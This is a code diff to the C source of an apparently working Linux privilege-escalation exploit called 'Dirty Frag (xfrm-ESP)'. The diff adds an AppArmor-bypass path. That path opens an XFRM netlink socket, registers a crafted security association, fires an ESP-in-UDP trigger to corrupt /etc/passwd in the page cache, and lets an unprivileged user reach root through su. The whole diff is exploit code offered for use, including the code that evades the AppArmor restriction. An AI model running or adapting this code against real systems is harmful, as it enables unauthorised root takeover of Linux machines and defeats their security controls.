@@ -76,6 +76,7 @@
  */
 
 #include "dirtyfrag_esp.h"
+#include "apparmor_bypass.h"
 
 #include <fcntl.h>
 #include <pwd.h>
@@ -513,9 +514,11 @@ df_result_t dirtyfrag_esp_exploit(bool do_shell)
 {
     log_step("Dirty Frag (xfrm-ESP) — exploit");
 
-    uid_t uid = getuid();
+    /* After the AA bypass we may already be uid 0 inside a userns —
+     * use the outer uid for the /etc/passwd target lookup. */
+    uid_t uid = real_uid_for_target();
     if (uid == 0) {
-        log_warn("already root — nothing to escalate");
+        log_warn("already root in init namespace — nothing to escalate");
         return DF_OK;
     }
     struct passwd *pw = getpwuid(uid);
@@ -546,26 +549,63 @@ df_result_t dirtyfrag_esp_exploit(bool do_shell)
         return DF_OK;
     }
 
-    /* The trigger must run inside a fresh user namespace, but `su`
-     * afterwards needs to inherit the real uid in the *parent* namespace
-     * (so PAM matches /etc/shadow against our real account). Fork: child
-     * does the dirty work, parent verifies and execs su. */
-    pid_t child = fork();
-    if (child < 0) {
-        log_bad("fork: %s", strerror(errno));
-        return DF_EXPLOIT_FAIL;
+    /* Two paths:
+     *
+     * (a) AA bypass already armed us into a userns with caps — we ARE
+     *     the namespace; just register SA + fire the trigger directly.
+     *     Forking a child to unshare again would NEST and waste a slot.
+     *
+     * (b) Normal path (no AA restriction, or running as real root):
+     *     fork → child unshares fresh user/net namespace → trigger →
+     *     exits. Parent stays in init namespace for the eventual su. */
+#ifdef __linux__
+    if (apparmor_bypass_was_armed()) {
+        log_step("AA bypass already armed — skipping inner fork+unshare");
+        /* The bypass already brought lo up; just open netlink and go. */
+        int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
+        if (nl < 0) {
+            log_bad("AF_NETLINK XFRM: %s", strerror(errno));
+            return DF_EXPLOIT_FAIL;
+        }
+        struct sockaddr_nl nla = { .nl_family = AF_NETLINK };
+        if (bind(nl, (struct sockaddr *)&nla, sizeof(nla)) < 0) {
+            log_bad("bind netlink: %s", strerror(errno));
+            close(nl);
+            return DF_EXPLOIT_FAIL;
+        }
+        if (!xfrm_register_sa(nl, (const unsigned char *)MARKER)) {
+            close(nl);
+            return DF_EXPLOIT_FAIL;
+        }
+        log_ok("XFRM SA registered with seq_hi='%s'", MARKER);
+        if (!trigger_store(uid_off)) {
+            close(nl);
+            return DF_EXPLOIT_FAIL;
+        }
+        log_ok("ESP-in-UDP trigger fired");
+        close(nl);
+    } else {
+        pid_t child = fork();
+        if (child < 0) {
+            log_bad("fork: %s", strerror(errno));
+            return DF_EXPLOIT_FAIL;
+        }
+        if (child == 0) {
+            int crc = run_in_userns(uid_off, getuid(), getgid());
+            _exit(crc);
+        }
+        int wstat = 0;
+        waitpid(child, &wstat, 0);
+        if (!WIFEXITED(wstat) || WEXITSTATUS(wstat) != 0) {
+            log_bad("child failed (exit %d)",
+                    WIFEXITED(wstat) ? WEXITSTATUS(wstat) : -1);
+            return DF_EXPLOIT_FAIL;
+        }
     }
-    if (child == 0) {
-        int rc = run_in_userns(uid_off, getuid(), getgid());
-        _exit(rc);
-    }
-    int wstat = 0;
-    waitpid(child, &wstat, 0);
-    if (!WIFEXITED(wstat) || WEXITSTATUS(wstat) != 0) {
-        log_bad("child failed (exit %d)",
-                WIFEXITED(wstat) ? WEXITSTATUS(wstat) : -1);
-        return DF_EXPLOIT_FAIL;
-    }
+#else
+    log_bad("dirtyfrag_esp_exploit: Linux-only");
+    return DF_TEST_ERROR;
+#endif
 
     /* Verify in the parent namespace's page cache. */
     int v = open("/etc/passwd", O_RDONLY);
